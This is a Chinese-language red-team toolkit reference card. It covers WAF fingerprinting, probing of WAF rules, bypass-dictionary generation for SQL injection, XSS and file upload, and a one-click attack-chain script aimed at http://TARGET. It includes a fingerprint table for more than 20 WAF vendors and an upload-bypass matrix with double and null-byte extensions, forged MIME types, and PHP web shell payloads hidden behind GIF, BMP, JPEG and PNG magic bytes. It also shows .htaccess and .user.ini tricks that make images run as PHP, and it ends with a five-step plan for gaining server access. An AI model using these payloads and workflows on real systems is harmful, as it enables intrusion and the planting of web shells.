# 红队攻击链工具箱 (2026-05-29)

## 工具位置
```
/opt/redteam-toolchain/
├── waf-recon-bypass.py          # WAF指纹识别+规则探测+绕过策略
├── upload-capability-scanner.py # 上传能力评估(扩展名/MIME/内容/竞争条件)
├── redteam-attack-chain.py      # 完整攻击链自动化
├── waf-bypass-generator.py      # 绕过字典生成器
├── quick-attack.sh              # 一键部署脚本
└── README.md                    # 快速参考手册
```

## 快速使用

### WAF探测 (30秒)
```bash
python3 /opt/redteam-toolchain/waf-recon-bypass.py http://TARGET --full
python3 /opt/redteam-toolchain/waf-recon-bypass.py http://TARGET --detect
python3 /opt/redteam-toolchain/waf-recon-bypass.py http://TARGET --probe
```

### 上传能力评估 (60秒)
```bash
python3 /opt/redteam-toolchain/upload-capability-scanner.py http://TARGET
python3 /opt/redteam-toolchain/upload-capability-scanner.py http://TARGET /api/upload
```

### 生成绕过字典
```bash
python3 /opt/redteam-toolchain/waf-bypass-generator.py sql -o /tmp/sqli_bypass.txt
python3 /opt/redteam-toolchain/waf-bypass-generator.py xss --waf cloudflare
python3 /opt/redteam-toolchain/waf-bypass-generator.py upload -o /tmp/upload_bypass.txt
python3 /opt/redteam-toolchain/waf-bypass-generator.py sql --encode url -o /tmp/sqli_url.txt
```

### 完整攻击链
```bash
python3 /opt/redteam-toolchain/redteam-attack-chain.py http://TARGET
bash /opt/redteam-toolchain/quick-attack.sh http://TARGET /upload
```

## WAF指纹库 (20+国内外)

### 国内WAF
- 阿里云WAF: eagleid, x-server-id
- 腾讯云WAF: x-nws-log-uuid
- 华为云WAF: x-huawei-online-service
- 长亭雷池: server: openresty, chaitin/safe_line
- 深信服WAF: sangfor
- 知道创宇: x-powered-by-360wzb
- 安恒明御: 安恒信息/dbappsecurity
- 网御星云: leadsec
- 启明星辰: venustech
- 天融信: topsec/topwaf

### 国际WAF
- Cloudflare: cf-ray, cf-cache-status
- Akamai: x-akamai-transformed
- AWS WAF: x-amzn-requestid
- F5 BIG-IP: x-cnection, server: bigip
- Imperva: x-iinfo
- ModSecurity: mod_security
- FortiWeb: fortiweb/fortigate
- Barracuda: barra_counter_session
- Sucuri: x-sucuri-id
- Wordfence: wordfence

## 上传绕过技术矩阵

### 扩展名变换
```
shell.php.jpg, shell.php%00.jpg, shell.php;.jpg
shell.phtml, shell.pht, shell.php5, shell.php7
shell.phar, shell.inc, shell.cer, shell.shtml
```

### MIME类型伪造
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### 文件头伪造
```
GIF89a<?php system('id'); ?>
BM<?php system('id'); ?>
\xff\xd8\xff\xe0<?php system('id'); ?> (JPEG)
\x89PNG\r\n\x1a\n<?php system('id'); ?> (PNG)
```

### 配置文件上传
```
.htaccess: AddType application/x-httpd-php .jpg
.user.ini: auto_prepend_file=shell.jpg
```

## 报告输出位置
```
/tmp/waf_analysis/           # WAF探测报告
/tmp/upload_analysis/        # 上传能力报告
/tmp/redteam_attack/         # 完整攻击链报告
```

## 实战场景: 无法获取服务器控制权时

1. WAF识别 → 知道对手是谁
2. 规则探测 → 找到WAF盲区
3. 上传能力评估 → 找到突破口
4. 生成绕过Payload → 精准打击
5. 执行攻击链 → 获得权限
